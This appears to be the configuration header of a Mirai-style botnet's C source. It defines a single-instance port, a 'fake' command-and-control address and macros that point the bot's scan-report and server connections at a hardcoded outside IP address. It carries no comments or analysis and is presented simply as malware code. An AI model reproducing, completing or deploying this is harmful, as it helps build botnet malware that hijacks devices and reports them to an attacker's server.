#pragma once
#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>
#define STDIN 0
#define STDOUT 1
#define STDERR 2
#define FALSE 0
#define TRUE 1
typedef char BOOL;
typedef uint32_t ipv4_t;
typedef uint16_t port_t;
#define SINGLE_INSTANCE_PORT 22369
#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
#define FAKE_CNC_ADDR INET_ADDR(176,123,26,89)
#define FAKE_CNC_PORT 23
#define SIP 1926
#ifndef USEDOMAIN
#define SCANIP (int)inet_addr((const char*)"45.133.9.32");
#define SERVIP (int)inet_addr((const char*)"45.133.9.32");
#else
#define SCANDOM "45.133.9.32"
#define SERVDOM "45.133.9.32"
#define SCANIP (int)inet_addr((const char*)"45.133.9.32");
#define SERVIP (int)inet_addr((const char*)"45.133.9.32");
#endif
ipv4_t LOCAL_ADDR;
